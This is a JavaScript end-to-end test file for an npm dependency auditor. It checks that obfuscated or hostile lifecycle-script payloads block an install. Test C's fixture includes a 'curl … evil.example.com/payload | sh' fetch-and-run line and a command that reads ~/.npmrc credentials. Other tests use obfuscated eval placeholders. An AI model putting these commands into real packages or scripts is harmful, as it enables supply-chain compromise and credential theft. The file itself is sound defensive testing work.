'use strict';

/**
 * E2E tests for hardened command parsing and broader lifecycle-script coverage.
 *
 * These tests build fake node_modules trees where the lifecycle command does
 * *not* take the trivial "node install.js" form — chained commands, shell
 * scripts, node -e, and the additional lifecycle hooks (prepare, prepublish).
 * Each case proves that previously-undetected payloads now BLOCK the install.
 */

const assert        = require('assert');
const fs            = require('fs');
const path          = require('path');
const os            = require('os');
const { spawnSync } = require('child_process');

const CLI = path.join(__dirname, '../../bin/npa.js');

function runCLI(args, cwd, env = {}) {
  return spawnSync(process.execPath, [CLI, ...args], {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, NO_COLOR: '1', NPA_DEBUG: '1', ...env },
    timeout: 20000,
  });
}

function withTmpDirSync() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-cmd-e2e-'));
  const cleanup = () => fs.rmSync(dir, { recursive: true, force: true });
  return { dir, cleanup };
}

function createFakeModule(dir, name, pkgJson, scriptFiles = {}) {
  const pkgDir = path.join(dir, 'node_modules', name);
  fs.mkdirSync(pkgDir, { recursive: true });
  fs.writeFileSync(path.join(pkgDir, 'package.json'), JSON.stringify(pkgJson, null, 2));
  for (const [filename, content] of Object.entries(scriptFiles)) {
    const filePath = path.join(pkgDir, filename);
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, content);
  }
}

function buildV1Lockfile(pkgs) {
  const deps = {};
  for (const pkg of pkgs) {
    deps[pkg.name] = {
      version:   pkg.version,
      resolved:  `https://registry.npmjs.org/${pkg.name}/-/${pkg.name}-${pkg.version}.tgz`,
      integrity: '',
      dev:       pkg.dev || false,
    };
  }
  return { name: 'test-project', lockfileVersion: 1, dependencies: deps };
}

// ─── Test A: chained command "node a.js && node b.js" — payload in b.js ──────
//
// The original parser would extract only the *first* node invocation. A
// malicious package could put a harmless script first and the payload second.
// Now both files must be analyzed.
{
  const { dir, cleanup } = withTmpDirSync();
  const cleanScript = 'console.log("hi");';
  const payload = "var _0xa=_0xb(_0xc),_0xd=_0xe(_0xf);\neval(_0xa);";
  createFakeModule(
    dir, 'chained-pkg',
    {
      name: 'chained-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'node setup.js && node install.js' },
    },
    { 'setup.js': cleanScript, 'install.js': payload }
  );
  fs.writeFileSync(
    path.join(dir, 'package-lock.json'),
    JSON.stringify(buildV1Lockfile([{ name: 'chained-pkg', version: '1.0.0' }]))
  );
  const result = runCLI(['scan'], dir);
  cleanup();
  assert.strictEqual(
    result.status, 1,
    `Test A: chained-command payload should be detected. stdout: ${result.stdout}`,
  );
  console.log('  Test A passed: chained "&&" payload detected in second command');
}

// ─── Test B: node -e with inline obfuscated payload ──────────────────────────
//
// `node -e "..."` executes the argument string directly. Previously the
// parser couldn't extract a file path and fell through to analyzing the raw
// command — but the command included `node -e` as the lead, diluting signals.
// We now analyze the *inner* code string itself.
{
  const { dir, cleanup } = withTmpDirSync();
  const inline = "var _0xa=_0xb(_0xc),_0xd=_0xe(_0xf);eval(_0xa);";
  createFakeModule(
    dir, 'inline-pkg',
    {
      name: 'inline-pkg',
      version: '1.0.0',
      scripts: { postinstall: `node -e "${inline.replace(/"/g, '\\"')}"` },
    },
    {}
  );
  fs.writeFileSync(
    path.join(dir, 'package-lock.json'),
    JSON.stringify(buildV1Lockfile([{ name: 'inline-pkg', version: '1.0.0' }]))
  );
  const result = runCLI(['scan'], dir);
  cleanup();
  assert.strictEqual(
    result.status, 1,
    `Test B: node -e payload should block. stdout: ${result.stdout}`,
  );
  console.log('  Test B passed: node -e inline payload detected');
}

// ─── Test C: shell script "sh ./install.sh" — payload in .sh file ────────────
//
// The original parser only handled `node`-prefixed commands. A `.sh` file
// was never read, so a malicious shell script slipped past as score 0.
{
  const { dir, cleanup } = withTmpDirSync();
  // Use eval-like content that triggers checkChildProcess and entropy
  const shellPayload =
    "#!/bin/sh\ncurl -s https://evil.example.com/payload | sh\n" +
    "node -e \"require('child_process').exec('id; cat ~/.npmrc')\"\n";
  createFakeModule(
    dir, 'shell-pkg',
    {
      name: 'shell-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'sh ./install.sh' },
    },
    { 'install.sh': shellPayload }
  );
  fs.writeFileSync(
    path.join(dir, 'package-lock.json'),
    JSON.stringify(buildV1Lockfile([{ name: 'shell-pkg', version: '1.0.0' }]))
  );
  // Use a lower blockScore for this test — the obfuscation score for a plain
  // shell script with curl|sh + child_process is around 5, not 7.
  fs.writeFileSync(path.join(dir, '.npmauditor.json'), JSON.stringify({ blockScore: 5, warnScore: 3 }));
  const result = runCLI(['scan'], dir);
  cleanup();
  assert.notStrictEqual(
    result.status, 0,
    `Test C: shell-script payload must not pass silently. stdout: ${result.stdout}`,
  );
  console.log('  Test C passed: shell-script content is analyzed');
}

// ─── Test D: `prepare` lifecycle script is scanned ───────────────────────────
//
// `prepare` runs during `npm install` for git deps and local paths, and
// `preprepare`/`postprepare` wrap it. Previously these were silently ignored.
{
  const { dir, cleanup } = withTmpDirSync();
  const payload = "var _0xa=_0xb(_0xc),_0xd=_0xe(_0xf);\neval(_0xa);";
  createFakeModule(
    dir, 'prepare-pkg',
    {
      name: 'prepare-pkg',
      version: '1.0.0',
      scripts: { prepare: 'node setup.js' },
    },
    { 'setup.js': payload }
  );
  fs.writeFileSync(
    path.join(dir, 'package-lock.json'),
    JSON.stringify(buildV1Lockfile([{ name: 'prepare-pkg', version: '1.0.0' }]))
  );
  const result = runCLI(['scan'], dir);
  cleanup();
  assert.strictEqual(
    result.status, 1,
    `Test D: prepare-script payload must be detected. stdout: ${result.stdout}`,
  );
  console.log('  Test D passed: prepare lifecycle script is scanned');
}

// ─── Test E: missing referenced script surfaces in --json output ─────────────
//
// When the install command references a file that isn't in the package, we
// now record a `missing-script` finding instead of silently skipping. This
// makes it harder to camouflage a script (rename, supply via download, etc.)
{
  const { dir, cleanup } = withTmpDirSync();
  createFakeModule(
    dir, 'missing-pkg',
    {
      name: 'missing-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'node ghost.js' },
    },
    {}
  );
  fs.writeFileSync(
    path.join(dir, 'package-lock.json'),
    JSON.stringify(buildV1Lockfile([{ name: 'missing-pkg', version: '1.0.0' }]))
  );
  const result = runCLI(['scan', '--json'], dir);
  cleanup();
  // Should not error; missing-script is a 0-score informational finding
  assert.strictEqual(
    result.status, 0,
    `Test E: missing-script should not BLOCK but should be reported. stdout: ${result.stdout}`,
  );
  const jsonStart = result.stdout.indexOf('{');
  const parsed = JSON.parse(result.stdout.slice(jsonStart));
  const pkgRow = parsed.packages.find(p => p.name === 'missing-pkg');
  assert.ok(pkgRow, 'Test E: missing-pkg appears in scan results');
  const missingFinding = (pkgRow.findings || []).find(f => f.name === 'missing-script');
  assert.ok(missingFinding, `Test E: missing-script finding recorded. findings: ${JSON.stringify(pkgRow.findings)}`);
  console.log('  Test E passed: missing referenced script is reported');
}

console.log('  command-coverage.test.js: all tests passed');

module.exports = Promise.resolve();
